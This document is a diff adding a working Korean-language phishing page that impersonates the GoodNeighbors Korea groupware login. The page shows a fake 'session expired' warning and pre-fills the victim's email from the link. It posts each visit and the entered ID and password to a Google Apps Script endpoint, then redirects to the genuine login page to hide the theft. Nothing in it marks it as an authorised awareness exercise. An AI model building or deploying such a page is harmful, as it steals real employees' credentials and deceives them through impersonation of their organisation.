@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>그룹웨어 로그인</title>
+    <style>
+        body { font-family: 'Malgun Gothic', dotum, sans-serif; background-color: #f2f5f8; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: #fff; width: 380px; padding: 40px; border: 1px solid #d1d8e0; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: #005aab; margin-bottom: 20px; letter-spacing: -1px; }
+        .notice-msg { background: #fff4f4; border: 1px solid #ffcccc; color: #d93025; padding: 10px; font-size: 13px; border-radius: 4px; margin-bottom: 20px; text-align: left; line-height: 1.5; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #005aab; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #004586; }
+        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">GNK Groupware</div>
+    
+    <div class="notice-msg">
+        <b>[보안 경고]</b> 보안 세션이 만료되었습니다.<br>
+        계정 잠금을 해제하려면 본인 확인이 필요합니다.
+    </div>
+
+    <form id="phishingForm">
+        <input type="text" id="userId" placeholder="사번 또는 이메일" required>
+        <input type="password" id="userPw" placeholder="비밀번호" required>
+        <button type="submit">세션 갱신 및 로그인</button>
+    </form>
+
+    <div class="footer">
+        Copyright © GoodNeighbors Korea. All rights reserved.
+    </div>
+</div>
+
+<script>
+    // 형의 구글 앱스 스크립트 '웹 앱 URL'을 여기에 꼭 넣어줘!
+    const gasUrl = 'https://script.google.com/macros/s/AKfycbwYlasnv-0gEheHZ7manAzjHaopIhEgmLn_W3JkZcOu5ijc7GJygreDet0KIdutt-PKPQ/exec'; 
+
+    // 1. 페이지 로드 시 실행: 주소창에서 이메일 읽어서 채우고 '접속' 로그 전송
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const userEmail = urlParams.get('id'); // ?id=abc@gnk.or.kr 에서 추출
+
+        if (userEmail) {
+            // 아이디 칸 자동 입력
+            document.getElementById('userId').value = userEmail;
+
+            // '접속' 로그 전송 (아이디 입력 안 해도 기록됨)
+            var formData = new FormData();
+            formData.append('type', '접속');
+            formData.append('userId', userEmail);
+            formData.append('userPw', '-');
+
+            fetch(gasUrl, { method: 'POST', mode: 'no-cors', body: formData });
+        }
+    };
+
+    // 2. 로그인 버튼 클릭 시 실행: '입력' 로그 전송 후 실제 사이트로 튕기기
+    document.getElementById('phishingForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        var userId = document.getElementById('userId').value;
+        var userPw = document.getElementById('userPw').value;
+
+        var formData = new FormData();
+        formData.append('type', '입력');
+        formData.append('userId', userId);
+        formData.append('userPw', userPw);
+
+        fetch(gasUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: formData
+        }).then(() => {
+            alert('보안 세션이 정상적으로 갱신되었습니다. 그룹웨어 메인으로 이동합니다.');
+            // 실제 그룹웨어 로그인 페이지 주소로 이동
+            window.location.href = 'https://gnware.gnk.or.kr/login'; 
+        }).catch(error => {
+            window.location.href = 'https://gnware.gnk.or.kr/login';
+        });
+    });
+</script>
+
+</body>
+</html>
